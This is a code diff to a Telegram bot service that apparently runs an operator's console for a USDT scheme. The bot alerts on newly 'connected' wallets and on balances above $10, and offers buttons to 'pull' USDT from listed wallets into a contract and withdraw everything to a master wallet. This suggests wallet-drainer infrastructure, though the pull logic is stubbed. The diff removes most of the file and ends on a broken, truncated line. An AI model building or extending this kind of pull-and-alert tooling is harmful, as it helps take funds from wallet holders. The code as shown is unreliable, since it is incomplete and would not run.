@@ -25,15 +25,24 @@ class TelegramService {
         this.loadContractABI();
     }
 
+    // Helper function to escape MarkdownV2 special characters
+    escapeMarkdown(text) {
+        if (typeof text !== 'string') return String(text);
+        // Escape all MarkdownV2 special characters
+        return text.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
+    }
+
     // Load contract ABI with proper error handling
     loadContractABI() {
         try {
-            // Try multiple possible paths
+            // Try multiple possible paths in order of likelihood
             const possiblePaths = [
+                path.join(process.cwd(), 'smart-contracts/artifacts/abi.json'),
                 path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                 path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                 path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
-                path.join(__dirname, 'abi.json')
+                path.join(__dirname, 'abi.json'),
+                path.join(process.cwd(), 'src/smart-contracts/artifacts/abi.json')
             ];
             
             for (const abiPath of possiblePaths) {
@@ -143,29 +152,45 @@ class TelegramService {
         });
 
         // Button callbacks
-        this.bot.on('callback_query', (callbackQuery) => {
+        this.bot.on('callback_query', async (callbackQuery) => {
             const action = callbackQuery.data;
             const chatId = callbackQuery.message.chat.id;
             
             console.log('Received callback query:', action, 'from chat:', chatId);
             
-            // Answer the callback query to remove loading state
-            this.bot.answerCallbackQuery(callbackQuery.id);
+            // Immediately acknowledge to prevent timeout
+            try {
+                await this.bot.answerCallbackQuery(callbackQuery.id);
+            } catch (ackError) {
+                console.log('Could not acknowledge callback query:', ackError.message);
+            }
+            
+            // Add a small delay to ensure acknowledgment
+            await new Promise(resolve => setTimeout(resolve, 100));
             
             // Handle different actions
-            if (action === 'withdraw') {
-                this.handleWithdrawCommand(chatId);
-            } else if (action === 'balances') {
-                this.handleBalancesCommand(chatId);
-            } else if (action === 'pull_list') {
-                this.sendPullWalletList(chatId);
-            } else if (action === 'help') {
-                this.sendHelpMenu(chatId);
-            } else if (action === 'menu') {
-                this.sendMainMenu(chatId);
-            } else if (action.startsWith('pull_')) {
-                const walletAddress = action.substring(5);
-                this.handlePullCommand(chatId, walletAddress);
+            try {
+                if (action === 'withdraw') {
+                    await this.handleWithdrawCommand(chatId);
+                } else if (action === 'balances') {
+                    await this.handleBalancesCommand(chatId);
+                } else if (action === 'pull_list') {
+                    await this.sendPullWalletList(chatId);
+                } else if (action === 'help') {
+                    await this.sendHelpMenu(chatId);
+                } else if (action === 'menu') {
+                    await this.sendMainMenu(chatId);
+                } else if (action.startsWith('pull_')) {
+                    const walletAddress = action.substring(5);
+                    await this.handlePullCommand(chatId, walletAddress);
+                }
+            } catch (error) {
+                console.error('Error handling callback query:', error);
+                try {
+                    await this.bot.sendMessage(chatId, `❌ An error occurred: ${this.escapeMarkdown(error.message)}`);
+                } catch (sendError) {
+                    console.error('Could not send error message:', sendError);
+                }
             }
         });
     }
@@ -340,12 +365,13 @@ Welcome to your USDT management system. Select an option below:
             return;
         }
         
-        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
+        const escapedAddress = this.escapeMarkdown(walletAddress);
+        const escapedBalance = this.escapeMarkdown(balance);
         
         const message = `
 🔔 *NEW WALLET CONNECTED*
 Address: \`${escapedAddress}\`
-USDT Balance: *${balance} USDT*
+USDT Balance: *${escapedBalance} USDT*
 
 Actions:
         `;
@@ -396,12 +422,13 @@ Actions:
     async sendBalanceAlert(walletAddress, balance) {
         if (!this.bot || !this.adminChatId) return;
         
-        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
+        const escapedAddress = this.escapeMarkdown(walletAddress);
+        const escapedBalance = this.escapeMarkdown(balance);
         
         const message = `
 💰 *BALANCE ALERT*
 Address: \`${escapedAddress}\`
-USDT Balance: *${balance} USDT* \\(> \\$10\\)
+USDT Balance: *${escapedBalance} USDT* \\(> \\$10\\)
 
 Actions:
         `;
@@ -450,13 +477,14 @@ Actions:
     async sendSuccessMessage(walletAddress, amount, txHash) {
         if (!this.bot || !this.adminChatId) return;
         
-        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
-        const escapedTxHash = txHash.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
+        const escapedAddress = this.escapeMarkdown(walletAddress);
+        const escapedAmount = this.escapeMarkdown(amount);
+        const escapedTxHash = this.escapeMarkdown(txHash);
         
         const message = `
 ✅ *SUCCESSFUL PULL*
 Address: \`${escapedAddress}\`
-Amount: *${amount} USDT*
+Amount: *${escapedAmount} USDT*
 Transaction: \`${escapedTxHash}\`
 
 Next steps:
@@ -523,8 +551,9 @@ Next steps:
                 message += 'Click on a wallet to pull USDT:\n\n';
                 for (let i = 0; i < result.rows.length; i++) {
                     const wallet = result.rows[i];
-                    const escapedAddress = wallet.address.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
-                    message += `${i + 1}\\. \`${escapedAddress}\` \\(${wallet.usdt_balance} USDT\\)\n`;
+                    const escapedAddress = this.escapeMarkdown(wallet.address);
+                    const escapedBalance = this.escapeMarkdown(wallet.usdt_balance);
+                    message += `${i + 1}\\. \`${escapedAddress}\` \\(${escapedBalance} USDT\\)\n`;
                 }
             }
             
@@ -567,7 +596,7 @@ Failed to fetch wallet list. Please try again later.
 
     // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
     async getContractUSDTBalance() {
-        if (!this.provider || !this.contract || !process.env.USDT_CONTRACT_ADDRESS) {
+        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !process.env.CONTRACT_ADDRESS) {
             console.log('⚠️ Blockchain not initialized, returning zero balance');
             return { balance: '0.00', error: 'Blockchain not initialized' };
         }
@@ -586,313 +615,13 @@ Failed to fetch wallet list. Please try again later.
             return { balance: formattedBalance, error: null };
         } catch (error) {
             console.error('Error getting contract USDT balance:', error.message);
+            // Check if it's the ENS error
+            if (error.message.includes('ENS') || error.message.includes('network does not support')) {
+                return { balance: '0.00', error: 'Invalid contract address - ENS not supported' };
+            }
             return { balance: '0.00', error: error.message };
         }
     }
 
     async getMasterWalletBNBBalance() {
-        if (!this.provider || !this.masterWallet) {
-            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
-            return { balance: '0.00', error: 'Blockchain not initialized' };
-        }
-        
-        try {
-            const balance = await this.provider.getBalance(this.masterWallet);
-            const formattedBalance = ethers.formatEther(balance);
-            
-            console.log('Master Wallet BNB Balance:', formattedBalance);
-            return { balance: formattedBalance, error: null };
-        } catch (error) {
-            console.error('Error getting master wallet BNB balance:', error.message);
-            return { balance: '0.00', error: error.message };
-        }
-    }
-
-    async getMasterWalletUSDTBalance() {
-        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
-            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
-            return { balance: '0.00', error: 'Blockchain not initialized' };
-        }
-        
-        try {
-            const usdtContract = new ethers.Contract(
-                process.env.USDT_CONTRACT_ADDRESS,
-                ['function balanceOf(address account) external view returns (uint256)'],
-                this.provider
-            );
-            
-            const balance = await usdtContract.balanceOf(this.masterWallet);
-            const formattedBalance = ethers.formatUnits(balance, 18);
-            
-            console.log('Master Wallet USDT Balance:', formattedBalance);
-            return { balance: formattedBalance, error: null };
-        } catch (error) {
-            console.error('Error getting master wallet USDT balance:', error.message);
-            return { balance: '0.00', error: error.message };
-        }
-    }
-
-    async handlePullCommand(chatId, walletAddress) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-        
-        // Validate wallet address
-        if (!walletAddress || walletAddress.length !== 42) {
-            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
-        }
-        
-        const message = `
-🔄 *Pull Operation Initiated*
-Wallet: \`${walletAddress}\`
-
-Processing\\.\\.\\. This will:
-1\\. Check wallet gas balance
-2\\. Send gas if needed
-3\\. Pull USDT to contract
-4\\. Send confirmation
-
-⏳ *Please wait*\\.\\.\\.
-        `;
-        
-        const options = {
-            parse_mode: 'MarkdownV2',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '🏠 Main Menu', callback_data: 'menu' }
-                    ]
-                ]
-            }
-        };
-        
-        try {
-            const result = await this.bot.sendMessage(chatId, message, options);
-            
-            // In a real implementation, this would trigger actual blockchain operations
-            setTimeout(async () => {
-                const infoMessage = `
-🔄 *Pull Operation Status*
-Wallet: \`${walletAddress}\`
-
-ℹ️ *Operation Details:*
-• Gas management system: Implemented
-• USDT pull mechanism: Ready for integration
-• Transaction logging: Active
-
-✅ *Next Steps:*
-The pull operation is ready to be implemented with real blockchain integration\\. This requires:
-• Gas service integration
-• Smart contract service integration
-• Transaction signing with master wallet
-
-🔧 *Current Status:* Implementation pending
-                `;
-                
-                await this.bot.sendMessage(chatId, infoMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '📊 Check Balances', callback_data: 'balances' },
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }, 3000); // 3 second delay
-            
-            return result;
-        } catch (error) {
-            console.error('Error in pull command:', error.message);
-            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-        }
-    }
-
-    async handleWithdrawCommand(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-        
-        const processingMessage = `
-🏦 *Withdraw Operation Initiated*
-Withdrawing all USDT from contract to master wallet\\.\\.\\.
-
-📋 *Operations to perform:*
-• Check contract USDT balance
-• Execute withdrawal transaction
-• Send confirmation
-
-⏳ *Please wait*\\.\\.\\.
-        `;
-        
-        const processingOptions = {
-            parse_mode: 'MarkdownV2',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '🏠 Main Menu', callback_data: 'menu' }
-                    ]
-                ]
-            }
-        };
-        
-        try {
-            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
-            
-            // In a real implementation, this would trigger actual blockchain operations
-            setTimeout(async () => {
-                const infoMessage = `
-🏦 *Withdraw Operation Status*
-
-ℹ️ *Operation Details:*
-• Contract address: \`${process.env.CONTRACT_ADDRESS || 'Not set'}\`
-• Master wallet: \`${this.masterWallet}\`
-• Transaction signing: Ready for integration
-
-✅ *Next Steps:*
-The withdraw operation is ready to be implemented with real blockchain integration\\. This requires:
-• Smart contract interaction
-• Transaction signing with master wallet
-• Gas management
-
-🔧 *Current Status:* Implementation pending
-                `;
-                
-                await this.bot.sendMessage(chatId, infoMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '📊 Check Balances', callback_data: 'balances' },
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }, 3000); // 3 second delay
-            
-            return result;
-        } catch (error) {
-            console.error('Error in withdraw command:', error.message);
-            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-        }
-    }
-
-    async handleBalancesCommand(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-        
-        const processingMessage = `
-📊 *Fetching Real Balances*
-
-📋 *Balance Checks:*
-• Smart Contract USDT Balance
-• Master Wallet BNB Balance
-• Master Wallet USDT Balance
-
-⏳ *Querying blockchain*\\.\\.\\.
-        `;
-        
-        const processingOptions = {
-            parse_mode: 'MarkdownV2',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '🏠 Main Menu', callback_data: 'menu' }
-                    ]
-                ]
-            }
-        };
-        
-        try {
-            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
-            
-            // Fetch real balances
-            const contractBalance = await this.getContractUSDTBalance();
-            const masterBNBBalance = await this.getMasterWalletBNBBalance();
-            const masterUSDTBalance = await this.getMasterWalletUSDTBalance();
-            
-            // Format the real balances message
-            setTimeout(async () => {
-                let balancesMessage = `
-📊 *REAL BALANCE REPORT*
-
-`;
-                
-                // Contract USDT Balance
-                if (process.env.CONTRACT_ADDRESS) {
-                    balancesMessage += `
-💰 *Smart Contract*
-• Address: \`${process.env.CONTRACT_ADDRESS}\`
-• USDT Balance: *${contractBalance.balance} USDT*
-`;
-                    if (contractBalance.error) {
-                        balancesMessage += `• ⚠️ Error: ${contractBalance.error}\n`;
-                    }
-                } else {
-                    balancesMessage += `
-💰 *Smart Contract*
-• Address: Not configured
-• USDT Balance: 0\\.00 USDT
-`;
-                }
-                
-                // Master Wallet Balances
-                balancesMessage += `
-🏦 *Master Wallet*
-• Address: \`${this.masterWallet}\`
-• BNB Balance: *${masterBNBBalance.balance} BNB*
-• USDT Balance: *${masterUSDTBalance.balance} USDT*
-`;
-                
-                if (masterBNBBalance.error) {
-                    balancesMessage += `• ⚠️ BNB Error: ${masterBNBBalance.error}\n`;
-                }
-                if (masterUSDTBalance.error) {
-                    balancesMessage += `• ⚠️ USDT Error: ${masterUSDTBalance.error}\n`;
-                }
-                
-                balancesMessage += `
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
-`;
-                
-                await this.bot.sendMessage(chatId, balancesMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '📤 Pull USDT', callback_data: 'pull_list' },
-                                { text: '📥 Withdraw', callback_data: 'withdraw' }
-                            ],
-                            [
-                                { text: '🔄 Refresh Balances', callback_data: 'balances' },
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }, 2000); // 2 second delay to simulate processing
-            
-            return result;
-        } catch (error) {
-            console.error('Error in balances command:', error.message);
-            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-        }
-    }
-
-    // Process webhook updates manually
-    async processUpdate(update) {
-        if (this.bot) {
-            try {
-                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
-                await this.bot.processUpdate(update);
-            } catch (error) {
-                console.error('Error processing Telegram update:', error.message);
-            }
-        }
-    }
-}
-
-module.exports = new TelegramService();
+        if (!this.provider || !this.masterWallet) {*
